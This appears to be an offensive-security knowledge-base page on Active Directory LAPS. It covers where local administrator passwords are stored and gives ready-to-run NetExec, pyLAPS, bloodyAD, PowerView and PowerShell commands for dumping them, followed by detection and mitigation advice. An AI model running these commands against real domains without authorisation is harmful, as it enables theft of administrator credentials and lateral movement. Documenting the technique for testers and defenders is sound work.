---
title: LAPS (Local Admin Passwords)
category: AD / Credentials
order: 60
tags:
  - laps
  - credentials
  - dacl-abuse
  - local-admin
  - lateral-movement
  - bloodhound
summary: Read the per-machine local admin password from AD when you hold the read right — cleartext ms-Mcs-AdmPwd (LAPS v1) or the encrypted msLAPS-EncryptedPassword blob (Windows LAPS v2).
prerequisites:
  - "LAPS v1: ReadProperty / ControlAccess on ms-Mcs-AdmPwd of the target computer object (BloodHound ReadLAPSPassword edge)"
  - "Windows LAPS v2 encrypted: read is not enough — you must be in the AuthorizedDecryptor principal (Domain Admins by default) to DECRYPT msLAPS-EncryptedPassword"
  - LDAP/LDAPS reachability to a DC
tools:
  - netexec / nxc -M laps
  - LAPSDumper
  - pyLAPS
  - bloodyAD
  - LAPS4LINUX
  - LAPSToolkit
  - PowerView
  - Get-LapsADPassword
detection:
  - Event ID 4662 on a SACL auditing reads of ms-Mcs-AdmPwd / msLAPS-EncryptedPassword; bulk reads by a regular user indicate credential harvesting
  - Enumerate who currently holds the read/decrypt delegation (LAPSToolkit Find-LAPSDelegatedGroups) and alert on delegation changes
mitigation:
  - Prefer Windows LAPS v2 with encryption and a tightly scoped AuthorizedDecryptor group; migrate off v1 (which stores plaintext in AD)
  - Apply least privilege to the read delegation and keep rotation intervals short
  - Tier admin/jump hosts so a single LAPS read does not cross tiers
refs:
  - label: HackTricks - LAPS
    url: https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/laps.html
  - label: The Hacker Recipes - ReadLAPSPassword
    url: https://www.thehacker.recipes/ad/movement/dacl/readlapspassword
  - label: XPN - LAPS 2.0 Internals (encryption / DPAPI-NG)
    url: https://blog.xpnsec.com/lapsv2-internals/
  - label: Microsoft - Get-LapsADPassword cmdlet
    url: https://learn.microsoft.com/en-us/powershell/module/laps/get-lapsadpassword
  - label: NetExec - laps.py module
    url: https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/laps.py
  - label: InternalAllTheThings - Read LAPS password
    url: https://swisskyrepo.github.io/InternalAllTheThings/active-directory/pwd-read-laps/
---

## What LAPS is

LAPS (Local Administrator Password Solution) makes each domain-joined machine set a unique random local-administrator password and store it in AD on its own computer object, rotating it on a schedule. If you can read that attribute you get local admin on that host — and because delegation is often applied too broadly, the same read right frequently exposes many machines at once.

## Where the password lives

**Legacy LAPS (v1):** cleartext in the confidential attribute **`ms-Mcs-AdmPwd`** (reads are ACL-gated); expiry in `ms-Mcs-AdmPwdExpirationTime`.

**Windows LAPS (v2)** — built into Win11 22H2 / Server 2025 and backported to Win10 / Server 2019+:
- `msLAPS-Password` — cleartext, *only if encryption is disabled* in policy.
- **`msLAPS-EncryptedPassword`** — DPAPI-NG / [MS-GKDI] group-key encrypted (AES-256).
- `msLAPS-PasswordExpirationTime` — expiry.

Holding the read right is BloodHound's **ReadLAPSPassword** edge. Critical v2 nuance: **read is not decrypt**. The encrypted blob is bound to an `AuthorizedDecryptor` principal (Domain Admins by default). If you can read but not decrypt, the blob still tells you *who* can decrypt it — a fresh privilege-escalation target.

## Read it (Linux)

```sh
# NetExec module — handles v1 and v2; decrypts if you are an authorized decryptor
nxc ldap $dc_ip -u $user -p $password -M laps
nxc ldap $dc_ip -u $user -H <NTLMHASH> -M laps

# LAPSDumper
python3 laps.py -u $user -p $password -d $domain

# pyLAPS
./pyLAPS.py --action get -u $user -d $domain -p $password --dc-ip $dc_ip

# bloodyAD (LAPS v1 filter shown)
bloodyAD --host $dc_ip -d $domain -u $user -p $password get search \
  --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```

For encrypted Windows LAPS blobs from Linux, `lapsv2decrypt` / LAPS4LINUX / dpapi-ng tooling decrypt when run as (or with the keys of) an authorized decryptor.

## Read it (Windows)

```powershell
# Native Windows LAPS cmdlet — auto-decrypts v2 when you are authorized
Get-LapsADPassword -Identity $target_user -AsPlainText

# PowerView (v1)
Get-DomainComputer $target_user -Properties ms-mcs-AdmPwd

# LAPSToolkit — dump + find who is delegated read
Get-LAPSComputers
Find-LAPSDelegatedGroups
```

## Prerequisites

- `ReadProperty` / `ControlAccess` on the LAPS attribute of the target computer (v1), or
- Membership in the `AuthorizedDecryptor` group to decrypt (v2 encrypted).

## Detection

- SACL + **Audit Directory Service Access** on computer objects -> **Event 4662** reads of `ms-Mcs-AdmPwd` / `msLAPS-EncryptedPassword`; regular users reading these at scale is credential harvesting.
- Periodically enumerate who holds the read/decrypt delegation (`Find-LAPSDelegatedGroups`) and alert on delegation changes.

## Mitigation

- Prefer **Windows LAPS v2 with encryption** and a tightly scoped decryptor group; migrate off v1 (plaintext in AD).
- Least-privilege the read delegation; keep rotation intervals short.
- Tier admin/jump hosts so one LAPS read cannot cross tiers.
